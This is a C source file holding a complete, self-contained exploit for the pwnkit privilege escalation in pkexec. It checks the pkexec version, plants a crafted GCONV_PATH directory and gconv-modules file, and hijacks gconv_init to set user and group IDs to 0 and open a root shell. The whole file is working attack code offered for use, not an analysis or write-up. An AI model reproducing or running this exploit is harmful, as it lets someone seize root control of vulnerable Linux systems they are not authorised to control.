/**
 * This is a self contained version() of the pwnkit exploit code 
 * and this can be used on targets that do have gcc installed on them 
 * or on any target out there vulnerable to the pwnkit local priv escalation.
 * 
 * author (@BinaryChunk) \0/
 */

#define _GNU_SOURCE

#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <wait.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#define PATH "/usr/bin/pkexec"

const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";


static bool is_vulnerable = true;

void p_kill(char *error){
	fprintf(stderr, "\033[0;31m[-- %s\033[0m\n", error);
	kill(getpid(), SIGINT);	
}

void sighandler(int signum){
	fprintf(stderr, "\033[0;31m[-- exiting....!\033[0m\n");
	_exit(1);	
}

bool check_if_vulnerable(){
	int pipefd[2];
	char version[21 + 1] = {0};
	
	pipe(pipefd);
	
	if (fork() == 0){
		close(pipefd[0]);
		dup2(pipefd[1], STDOUT_FILENO);
		char *args[] = {PATH, "--version", NULL};
		execv(PATH, args);
		_exit(0);
	}

	wait(NULL);
	close(pipefd[1]);
	read(pipefd[0], version, sizeof(version));
	close(pipefd[0]);
	
	if (strstr(version, "0.105") == NULL){
		is_vulnerable = false;
	}

	return is_vulnerable;
}

void exploit(){
	int ret;
	char *pkexec_args[] = {NULL};
	char *pkexec_envp[] = {"tmp", "CHARSET=PWNKIT", "SHELL=foo", "PATH=GCONV_PATH=.", NULL};
	char buff[4096 + 1] = {0}; 

	ret = mkdir("GCONV_PATH=.", 0755);
	if (ret < 0 && errno != EEXIST){
		fprintf(stderr, "error creating file");
	}
	
	creat("GCONV_PATH=./tmp", 0777);
	mkdir("tmp", 0755);
	
	FILE *fp  = fopen("./tmp/gconv-modules", "w+");
	
	if (fputs("module UTF-8// PWNKIT// preload 2", fp) < 0){
		p_kill("Error writing into file");
	}
	fclose(fp);
	
	readlink("/proc/self/exe", buff, sizeof(buff));
	ret = symlink(buff, "./tmp/preload.so");
	
	if (ret < 0 && errno != EEXIST){
		p_kill("error! creating the file");
	}
	
	execve(PATH, pkexec_args, pkexec_envp);
}

void gconv() {}
void gconv_init(){
	setresuid(0, 0, 0);
	setresgid(0, 0, 0);
	
	char *args[] = {"/bin/sh", NULL};
	char *envp[] = {"TERM=xterm-256color", "PATH=/usr/bin:/usr/sbin:/usr/games:/usr/local/bin", NULL};
	
	
	fprintf(stderr, "\033[0;32m[-- Success!..Gained 'root' :)\033[0m\n");	
	wait(NULL);
	execve(args[0], args, envp);
	_exit(0);
}


void _start(){
	struct sigaction act;
	act.sa_handler = &sighandler;
	sigemptyset(&act.sa_mask);
	
	sigaction(SIGINT, &act, NULL);
	
	if (check_if_vulnerable()){
		chdir("/tmp");
		exploit();
	}else{
		p_kill("version() doesn't seem vulnerable!");
	}
}
